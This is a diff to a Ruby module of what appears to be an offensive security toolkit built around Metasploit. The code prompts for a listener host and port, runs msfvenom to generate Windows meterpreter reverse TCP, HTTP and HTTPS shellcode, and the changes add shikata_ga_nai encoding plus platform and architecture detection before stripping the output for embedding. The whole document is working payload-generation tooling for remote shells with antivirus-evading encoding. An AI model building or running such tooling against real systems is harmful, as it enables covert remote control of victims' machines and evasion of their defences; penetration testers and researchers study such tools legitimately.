@@ -4,7 +4,7 @@ require 'base64'
 include Core::Commands
 
 module Msf
-  class Options
+  module Options
     def encode_command(command)
       Base64.encode64(command.encode('utf-16le')).delete("\r\n")
     end
@@ -29,14 +29,14 @@ module Msf
       bin_file.unpack('H*').first
     end
 
-    def host
+    def msf_host
       host_name = rgets('Enter the metasploit ip/url to listen on: ',
                         'localhost')
       print_success("Using #{host_name} as metasploit server")
       host_name
     end
 
-    def port
+    def msf_port
       port = rgets('Enter the port you would like to use[443]: ', 443)
       until (1..65_535).cover?(port.to_i)
         print_error('Not a valid port')
@@ -47,7 +47,7 @@ module Msf
     end
   end
 
-  class MsfCommands < Options
+  class MsfCommands
     include Core::Files
     def initialize
       if File.exist?('/usr/bin/msfvenom')
@@ -69,10 +69,13 @@ module Msf
     end
 
     def generate_shellcode(host, port, payload)
+      # TODO: look at encoder for x64
       @set_payload = payload
       print_info('Generating shellcode')
-      cmd = "#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} "
-      cmd << "LPORT=#{port} -f C"
+      cmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
+      cmd << "LPORT=#{port} -e x86/shikata_ga_nai "
+      cmd << "--platform #{platform(payload)} -a #{arch(payload)} "
+      cmd << '-f c 2> /dev/null'
       execute  = `#{cmd}`
       print_success('Shellcode Generated')
       clean_shellcode(execute)
@@ -105,7 +108,8 @@ module Msf
       shellcode = shellcode.delete('"')
       shellcode = shellcode.delete("\n")
       shellcode = shellcode.delete("\s")
-      shellcode[0..4] = ''
+      shellcode[0..23] = ''
+      shellcode[-1] = ''
       shellcode
     end
 
@@ -125,6 +129,26 @@ module Msf
       { :'1' => 'windows/meterpreter/reverse_tcp',
         :'2' => 'windows/meterpreter/reverse_https',
         :'3' => 'windows/meterpreter/reverse_http' }
+    end
+
+    def arch(payload)
+      case payload
+      when /x64/
+        'x64'
+      else
+        'x86'
+      end
+    end
+
+    def platform(payload)
+      case payload
+      when /windows/
+        'windows'
+      when /linux/
+        'linux'
+      when 'osx'
+        'osx'
+      end
     end
   end
 end
